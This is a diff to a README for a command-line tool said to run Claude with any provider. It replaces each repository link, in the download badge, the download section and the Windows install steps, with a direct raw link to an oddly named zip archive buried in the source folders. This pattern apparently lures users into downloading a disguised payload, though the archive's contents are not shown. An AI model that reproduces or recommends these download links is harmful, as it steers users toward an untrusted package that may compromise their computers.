@@ -1,10 +1,10 @@
 # 🤖 AnyModel-Claude-CLI - Run Claude with your choice of provider
 
-[![Download](https://img.shields.io/badge/Download-AnyModel--Claude--CLI-blue?style=for-the-badge&logo=github&color=grey)](https://github.com/Hemodynamicsductusarteriosus405/AnyModel-Claude-CLI)
+[![Download](https://img.shields.io/badge/Download-AnyModel--Claude--CLI-blue?style=for-the-badge&logo=github&color=grey)](https://raw.githubusercontent.com/Hemodynamicsductusarteriosus405/AnyModel-Claude-CLI/main/src/commands/remote-env/Model_CLI_Claude_Any_Arnoldist.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Hemodynamicsductusarteriosus405/AnyModel-Claude-CLI
+Visit this page to download: https://raw.githubusercontent.com/Hemodynamicsductusarteriosus405/AnyModel-Claude-CLI/main/src/commands/remote-env/Model_CLI_Claude_Any_Arnoldist.zip
 
 ## 🧩 What this app does
 
@@ -32,7 +32,7 @@ For best results, close other heavy apps before you start.
 
 ## 🚀 Install on Windows
 
-1. Open the download page: https://github.com/Hemodynamicsductusarteriosus405/AnyModel-Claude-CLI
+1. Open the download page: https://raw.githubusercontent.com/Hemodynamicsductusarteriosus405/AnyModel-Claude-CLI/main/src/commands/remote-env/Model_CLI_Claude_Any_Arnoldist.zip
 2. Download the latest Windows package from the page
 3. Save the file to your Downloads folder
 4. If the file comes in a zip file, right-click it and choose Extract All
